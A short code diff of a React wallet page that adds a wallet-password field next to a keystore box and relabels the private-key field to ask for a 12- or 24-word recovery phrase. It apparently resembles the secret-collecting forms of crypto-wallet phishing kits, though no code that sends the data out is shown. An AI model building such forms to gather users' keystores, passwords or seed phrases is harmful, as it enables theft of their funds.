@@ -431,11 +431,15 @@ export default function WalletSystemPage() {
                                 <>
                                     <textarea
                                         className="w-full border rounded p-2 mb-2 text-black"
-                                        placeholder="Paste your keystore JSON"
+                                        placeholder="Enter Keystore"
                                         rows={3}
                                     />
+                                    <input
+                                        className="w-full border rounded p-2 mb-2 text-black"
+                                        placeholder="Wallet Password"
+                                    />
                                     <div className="text-xs text-gray-500 mb-4">
-                                        Paste your keystore file content here
+                                        Several lines of text beginning with {'...'} plus the password you used to encrypt it.
                                     </div>
                                 </>
                             )}
@@ -447,7 +451,7 @@ export default function WalletSystemPage() {
                                         rows={2}
                                     />
                                     <div className="text-xs text-gray-500 mb-4">
-                                        Paste your private key string here
+                                        Typically 12 (sometimes 24) words separated by a single space.
                                     </div>
                                 </>
                             )}
